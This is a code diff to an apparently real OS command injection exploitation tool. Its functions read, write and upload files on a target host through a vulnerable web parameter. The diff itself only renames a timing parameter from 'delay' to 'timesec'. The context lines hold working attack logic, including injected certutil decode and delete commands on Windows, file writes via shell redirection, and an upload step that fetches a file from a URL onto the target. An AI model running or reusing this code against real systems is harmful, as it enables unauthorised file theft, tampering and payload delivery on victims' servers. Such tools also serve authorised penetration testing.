@@ -33,7 +33,7 @@ The "file-based" technique on semiblind OS command injection.
 """
 Read a file from the target host.
 """
-def file_read(separator, payload, TAG, delay, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
+def file_read(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
   file_to_read = menu.options.file_read
   # Execute command
   if settings.TARGET_OS == "win":
@@ -43,7 +43,7 @@ def file_read(separator, payload, TAG, delay, prefix, suffix, whitespace, http_r
   response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
   if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:
     # Evaluate injection results.
-    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
+    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
     shell = "".join(str(p) for p in shell)
     session_handler.store_cmd(url, cmd, shell, vuln_parameter)
   else:
@@ -69,7 +69,7 @@ def file_read(separator, payload, TAG, delay, prefix, suffix, whitespace, http_r
 """
 Write to a file on the target host.
 """
-def file_write(separator, payload, TAG, delay, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
+def file_write(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
   file_to_write = menu.options.file_write
   if not os.path.exists(file_to_write):
     warn_msg = "It seems that the '" + file_to_write + "' file, does not exists."
@@ -113,11 +113,11 @@ def file_write(separator, payload, TAG, delay, prefix, suffix, whitespace, http_
     # Decode base 64 encoding
     cmd = "certutil -decode "  + tmp_filname + " " + filname + separator + " " + settings.WIN_COMMENT
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)  
-    #fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
+    #fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
     # Delete tmp file
     cmd = "del "  + tmp_filname + separator + " " + settings.WIN_COMMENT
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)  
-    #fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
+    #fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
     # Check if file exists
     cmd = "cmd /c if exist " + filname + " (echo " + filname + ")" 
     dest_to_write = path + "\\" + filname 
@@ -125,13 +125,13 @@ def file_write(separator, payload, TAG, delay, prefix, suffix, whitespace, http_
   else:
     cmd = settings.FILE_WRITE + " '" + content + "'" + ">" + "'" + dest_to_write + "'" + settings.COMMENT
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
+    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
     shell = "".join(str(p) for p in shell)
     # Check if file exists
     cmd = "echo $(ls " + dest_to_write + ")"
 
   response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-  shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
+  shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
   shell = "".join(str(p) for p in shell)
   if shell:
     if settings.VERBOSITY_LEVEL >= 1:
@@ -148,7 +148,7 @@ def file_write(separator, payload, TAG, delay, prefix, suffix, whitespace, http_
 """
 Upload a file on the target host.
 """
-def file_upload(separator, payload, TAG, delay, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
+def file_upload(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
   if settings.TARGET_OS == "win":
     # Not yet implemented
     pass
@@ -174,7 +174,7 @@ def file_upload(separator, payload, TAG, delay, prefix, suffix, whitespace, http
     # Execute command
     cmd = settings.FILE_UPLOAD + file_to_upload + " -O " + dest_to_upload 
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
+    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
     shell = "".join(str(p) for p in shell)
     
     # Check if file exists!
@@ -183,7 +183,7 @@ def file_upload(separator, payload, TAG, delay, prefix, suffix, whitespace, http
     else:  
       cmd = "echo $(ls " + dest_to_upload + ")"
     response = fb_injector.injection(separator, payload, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
-    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, delay)
+    shell = fb_injector.injection_results(url, OUTPUT_TEXTFILE, timesec)
     shell = "".join(str(p) for p in shell)
     if shell:
       if settings.VERBOSITY_LEVEL >= 1:
@@ -201,18 +201,18 @@ def file_upload(separator, payload, TAG, delay, prefix, suffix, whitespace, http
 """
 Check the defined options
 """
-def do_check(separator, payload, TAG, delay, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
+def do_check(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename):
 
   if menu.options.file_write:
-    file_write(separator, payload, TAG, delay, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+    file_write(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     settings.FILE_ACCESS_DONE = True
 
   if menu.options.file_upload:
-    file_upload(separator, payload, TAG, delay, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+    file_upload(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     settings.FILE_ACCESS_DONE = True
 
   if menu.options.file_read:
-    file_read(separator, payload, TAG, delay, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
+    file_read(separator, payload, TAG, timesec, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename)
     settings.FILE_ACCESS_DONE = True 
 
 # eof
